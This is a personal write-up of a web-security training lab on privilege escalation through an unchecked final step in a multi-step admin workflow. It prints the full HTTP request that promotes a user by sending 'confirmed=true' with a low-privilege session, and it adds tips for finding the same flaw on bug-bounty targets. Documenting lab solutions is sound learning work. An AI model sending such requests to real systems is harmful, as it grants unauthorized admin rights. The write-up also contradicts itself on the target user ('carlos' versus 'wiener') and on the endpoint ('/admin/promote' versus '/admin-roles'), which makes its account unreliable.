# LAB: Multi-step process with no access control on one step

|                             |                                                                                                                                 |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| **Topic**                   | Access Control                                                                                                                  |
| **Difficulty**              | Practitioner                                                                                                                   |
| **Date**                    | 2026-11-15                                                                                                                   |
| **Time**                    |                                                                                                                                 |
| **Solved without solution** |                  yes                                                                                                               |
| **Link**                    | [lab-multi-step-process-with-no-access-control-on-one-step](https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step) |

## 1. Objective

Promote the user `carlos` to administrator status by bypassing role restrictions in a multi-step administrative action.

## 2. Surface

- The administrative panel interface where users can be managed or promoted.
- The multi-step confirmation and execution process (specifically the final action endpoint or confirmation parameter handling).
- HTTP requests involved in submitting the promotion request.

## 3. Hypothesis

If a multi-step administrative function verifies authorization only on the initial step or user interface page, but fails to validate privileges on the final confirmation or execution step, a lower-privileged user can directly invoke the final step parameter or endpoint to execute the privileged action.

## 4. Payload that worked

Request:
```http
POST /admin-roles HTTP/2
Host: <host>.web-security-academy.net
Cookie: session=<session>
Content-Length: 45
Cache-Control: max-age=0
Sec-Ch-Ua: "Not:A-Brand";v="8", "Chromium";v="156"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Origin: https://<host>.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://<host>.web-security-academy.net/admin-roles
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

action=upgrade&confirmed=true&username=wiener
```

Response:
```http
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

## 5. Why it works
The application enforces strict authorization checks on the initial interface and confirmation prompt, but completely omits session/privilege verification on the final state-change endpoint (`/admin/promote`). Because the server blindly trusts that any request containing `confirmed=true` for a given username represents a valid continuation of the workflow, substituting a low-privileged session cookie (`wiener`) alongside the target username successfully promotes the user without requiring administrator rights.

## 6. What I tried that failed

No failed payloads. 

## 7. In a real target (bounty translation)

- Where it shows up: User management panels, multi-stage billing/upgrade workflows, checkout flows, and administrative configuration wizards where critical actions are split across sequential requests.
- Quick detection: Intercepting the multi-step workflow in a proxy (like Burp Suite), skipping the intermediate validation or UI pages, and directly replaying or submitting the final request with a low-privileged session cookie.
- Impact: Privilege escalation, unauthorized administrative actions, or financial/data manipulation.
- In the report: Detailed request/response pairs demonstrating how skipping or directly invoking the final functional step bypasses access controls enforced on earlier steps.

## 8. Bypass / variants noticed

- Testing different HTTP methods on the confirmation endpoint to see if GET requests are incorrectly accepted instead of POST.
- Manipulating parameters directly within body parameters vs. query parameters during multi-step transitions.

## 9. Takeaway

Multi-step authorization checks must validate user privileges on every discrete request and state change, rather than assuming authorization inherited from previous steps.
